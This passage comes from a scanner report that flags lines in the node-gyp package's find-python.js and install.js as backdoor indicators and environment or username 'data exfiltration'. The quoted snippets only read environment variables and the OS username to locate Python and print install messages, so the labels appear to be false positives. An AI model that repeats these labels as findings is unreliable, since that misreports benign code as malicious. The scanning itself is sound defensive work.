                    "text": "    }\n  }\n\n  // Check if the py launcher can find a valid Python to use.\n  // Will exit the Python finder on success.\n  // Distributions of Python on Windows by default install with the \"py.exe\"\n  // Python launcher which is more likely to exist than the Python executable\n",
                    "rendered": {
                      "text": "    }\n  }\n\n  // Check if the py launcher can find a valid Python to use.\n  // Will exit the Python finder on success.\n  // Distributions of Python on Windows by default install with the \"py.exe\"\n  // Python launcher which is more likely to exist than the Python executable\n",
                      "markdown": "`    }\n  }\n\n  // Check if the py launcher can find a valid Python to use.\n  // Will exit the Python finder on success.\n  // Distributions of Python on Windows by default install with the \"py.exe\"\n  // Python launcher which is more likely to exist than the Python executable\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 119,
                  "startColumn": 57,
                  "endLine": 119,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        checks.push({\n          before: () => {\n            this.addLog(\n              'checking if the py launcher can be used to find Python 3')\n          },\n          check: () => this.checkPyLauncher()\n        })\n",
                    "rendered": {
                      "text": "        checks.push({\n          before: () => {\n            this.addLog(\n              'checking if the py launcher can be used to find Python 3')\n          },\n          check: () => this.checkPyLauncher()\n        })\n",
                      "markdown": "`        checks.push({\n          before: () => {\n            this.addLog(\n              'checking if the py launcher can be used to find Python 3')\n          },\n          check: () => this.checkPyLauncher()\n        })\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 1,
                  "endLine": 50,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\n  // These can be overridden for testing:\n  execFile = execFile\n  env = process.env\n  win = win\n  pyLauncher = 'py.exe'\n  winDefaultLocations = winDefaultLocationsArray\n",
                    "rendered": {
                      "text": "\n  // These can be overridden for testing:\n  execFile = execFile\n  env = process.env\n  win = win\n  pyLauncher = 'py.exe'\n  winDefaultLocations = winDefaultLocationsArray\n",
                      "markdown": "`\n  // These can be overridden for testing:\n  execFile = execFile\n  env = process.env\n  win = win\n  pyLauncher = 'py.exe'\n  winDefaultLocations = winDefaultLocationsArray\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 109,
                  "startColumn": 27,
                  "endLine": 109,
                  "endColumn": 38,
                  "snippet": {
                    "text": "            }\n            this.addLog('checking Python explicitly set from environment ' +\n              'variable PYTHON')\n            this.addLog(`- process.env.PYTHON is \"${this.env.PYTHON}\"`)\n          },\n          check: () => this.checkCommand(this.env.PYTHON)\n        }\n",
                    "rendered": {
                      "text": "            }\n            this.addLog('checking Python explicitly set from environment ' +\n              'variable PYTHON')\n            this.addLog(`- process.env.PYTHON is \"${this.env.PYTHON}\"`)\n          },\n          check: () => this.checkCommand(this.env.PYTHON)\n        }\n",
                      "markdown": "`            }\n            this.addLog('checking Python explicitly set from environment ' +\n              'variable PYTHON')\n            this.addLog(`- process.env.PYTHON is \"${this.env.PYTHON}\"`)\n          },\n          check: () => this.checkCommand(this.env.PYTHON)\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 27,
                  "endLine": 78,
                  "endColumn": 38,
                  "snippet": {
                    "text": "          before: () => {\n            this.addLog(\n              'checking Python explicitly set from NODE_GYP_FORCE_PYTHON')\n            this.addLog('- process.env.NODE_GYP_FORCE_PYTHON is ' +\n              `\"${this.env.NODE_GYP_FORCE_PYTHON}\"`)\n          },\n          check: () => this.checkCommand(this.env.NODE_GYP_FORCE_PYTHON)\n",
                    "rendered": {
                      "text": "          before: () => {\n            this.addLog(\n              'checking Python explicitly set from NODE_GYP_FORCE_PYTHON')\n            this.addLog('- process.env.NODE_GYP_FORCE_PYTHON is ' +\n              `\"${this.env.NODE_GYP_FORCE_PYTHON}\"`)\n          },\n          check: () => this.checkCommand(this.env.NODE_GYP_FORCE_PYTHON)\n",
                      "markdown": "`          before: () => {\n            this.addLog(\n              'checking Python explicitly set from NODE_GYP_FORCE_PYTHON')\n            this.addLog('- process.env.NODE_GYP_FORCE_PYTHON is ' +\n              `\"${this.env.NODE_GYP_FORCE_PYTHON}\"`)\n          },\n          check: () => this.checkCommand(this.env.NODE_GYP_FORCE_PYTHON)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 8,
                  "endLine": 50,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n  // These can be overridden for testing:\n  execFile = execFile\n  env = process.env\n  win = win\n  pyLauncher = 'py.exe'\n  winDefaultLocations = winDefaultLocationsArray\n",
                    "rendered": {
                      "text": "\n  // These can be overridden for testing:\n  execFile = execFile\n  env = process.env\n  win = win\n  pyLauncher = 'py.exe'\n  winDefaultLocations = winDefaultLocationsArray\n",
                      "markdown": "`\n  // These can be overridden for testing:\n  execFile = execFile\n  env = process.env\n  win = win\n  pyLauncher = 'py.exe'\n  winDefaultLocations = winDefaultLocationsArray\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 24,
                  "endLine": 19,
                  "endColumn": 35,
                  "snippet": {
                    "text": "const localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\nconst winDefaultLocationsArray = []\nfor (const majorMinor of ['311', '310', '39', '38']) {\n",
                    "rendered": {
                      "text": "const localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\nconst winDefaultLocationsArray = []\nfor (const majorMinor of ['311', '310', '39', '38']) {\n",
                      "markdown": "`const localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\nconst winDefaultLocationsArray = []\nfor (const majorMinor of ['311', '310', '39', '38']) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 49,
                  "endLine": 18,
                  "endColumn": 60,
                  "snippet": {
                    "text": "const username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\nconst winDefaultLocationsArray = []\n",
                    "rendered": {
                      "text": "const username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\nconst winDefaultLocationsArray = []\n",
                      "markdown": "`const username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\nconst winDefaultLocationsArray = []\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 21,
                  "endLine": 18,
                  "endColumn": 32,
                  "snippet": {
                    "text": "const username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\nconst winDefaultLocationsArray = []\n",
                    "rendered": {
                      "text": "const username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\nconst winDefaultLocationsArray = []\n",
                      "markdown": "`const username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\nconst winDefaultLocationsArray = []\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 26,
                  "endLine": 17,
                  "endColumn": 37,
                  "snippet": {
                    "text": "const systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\n",
                    "rendered": {
                      "text": "const systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\n",
                      "markdown": "`const systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 21,
                  "endLine": 16,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n",
                    "rendered": {
                      "text": "\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n",
                      "markdown": "`\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\nconst programFilesX86 = process.env['ProgramFiles(x86)'] || `${programFiles} (x86)`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 41,
                  "endLine": 15,
                  "endColumn": 52,
                  "snippet": {
                    "text": "}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\n",
                    "rendered": {
                      "text": "}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\n",
                      "markdown": "`}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 17,
                  "endLine": 15,
                  "endColumn": 28,
                  "snippet": {
                    "text": "}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\n",
                    "rendered": {
                      "text": "}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\n",
                      "markdown": "`}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 20,
                  "endLine": 14,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  } catch {}\n}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\n",
                    "rendered": {
                      "text": "  } catch {}\n}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\n",
                      "markdown": "`  } catch {}\n}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 25,
                  "endLine": 15,
                  "endColumn": 64,
                  "snippet": {
                    "text": "}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\n",
                    "rendered": {
                      "text": "}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\n",
                      "markdown": "`}\n\nconst systemDrive = process.env.SystemDrive || 'C:'\nconst username = process.env.USERNAME || process.env.USER || getOsUserInfo()\nconst localAppData = process.env.LOCALAPPDATA || `${systemDrive}\\\\${username}\\\\AppData\\\\Local`\nconst foundLocalAppData = process.env.LOCALAPPDATA || username\nconst programFiles = process.env.ProgramW6432 || process.env.ProgramFiles || `${systemDrive}\\\\Program Files`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000703"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Username)",
            "id": "BD000703"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 24,
                  "endLine": 10,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\nfunction getOsUserInfo () {\n  try {\n    return require('os').userInfo().username\n  } catch {}\n}\n\n",
                    "rendered": {
                      "text": "\nfunction getOsUserInfo () {\n  try {\n    return require('os').userInfo().username\n  } catch {}\n}\n\n",
                      "markdown": "`\nfunction getOsUserInfo () {\n  try {\n    return require('os').userInfo().username\n  } catch {}\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/install.js"
                },
                "region": {
                  "startLine": 415,
                  "startColumn": 72,
                  "endLine": 415,
                  "endColumn": 78,
                  "snippet": {
                    "text": "}\n\nmodule.exports = install\nmodule.exports.usage = 'Install node development files for the specified node version.'\n",
                    "rendered": {
                      "text": "}\n\nmodule.exports = install\nmodule.exports.usage = 'Install node development files for the specified node version.'\n",
                      "markdown": "`}\n\nmodule.exports = install\nmodule.exports.usage = 'Install node development files for the specified node version.'\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/install.js"
                },
                "region": {
                  "startLine": 415,
                  "startColumn": 31,
                  "endLine": 415,
                  "endColumn": 37,
                  "snippet": {
                    "text": "}\n\nmodule.exports = install\nmodule.exports.usage = 'Install node development files for the specified node version.'\n",
                    "rendered": {
                      "text": "}\n\nmodule.exports = install\nmodule.exports.usage = 'Install node development files for the specified node version.'\n",
                      "markdown": "`}\n\nmodule.exports = install\nmodule.exports.usage = 'Install node development files for the specified node version.'\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/install.js"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 40,
                  "endLine": 41,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  if (release.semver.prerelease[0] === 'pre') {\n    log.verbose('detected \"pre\" node version', release.version)\n    if (!gyp.opts.nodedir) {\n      throw new Error('\"pre\" versions of node cannot be installed, use the --nodedir flag instead')\n    }\n    log.verbose('--nodedir flag was passed; skipping install', gyp.opts.nodedir)\n    return\n",
                    "rendered": {
                      "text": "  if (release.semver.prerelease[0] === 'pre') {\n    log.verbose('detected \"pre\" node version', release.version)\n    if (!gyp.opts.nodedir) {\n      throw new Error('\"pre\" versions of node cannot be installed, use the --nodedir flag instead')\n    }\n    log.verbose('--nodedir flag was passed; skipping install', gyp.opts.nodedir)\n    return\n",
                      "markdown": "`  if (release.semver.prerelease[0] === 'pre') {\n    log.verbose('detected \"pre\" node version', release.version)\n    if (!gyp.opts.nodedir) {\n      throw new Error('\"pre\" versions of node cannot be installed, use the --nodedir flag instead')\n    }\n    log.verbose('--nodedir flag was passed; skipping install', gyp.opts.nodedir)\n    return\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/install.js"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 31,
                  "endLine": 39,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n  // 0.x.y-pre versions are not published yet and cannot be installed. Bail.\n  if (release.semver.prerelease[0] === 'pre') {\n    log.verbose('detected \"pre\" node version', release.version)\n    if (!gyp.opts.nodedir) {\n      throw new Error('\"pre\" versions of node cannot be installed, use the --nodedir flag instead')\n    }\n",
                    "rendered": {
                      "text": "\n  // 0.x.y-pre versions are not published yet and cannot be installed. Bail.\n  if (release.semver.prerelease[0] === 'pre') {\n    log.verbose('detected \"pre\" node version', release.version)\n    if (!gyp.opts.nodedir) {\n      throw new Error('\"pre\" versions of node cannot be installed, use the --nodedir flag instead')\n    }\n",
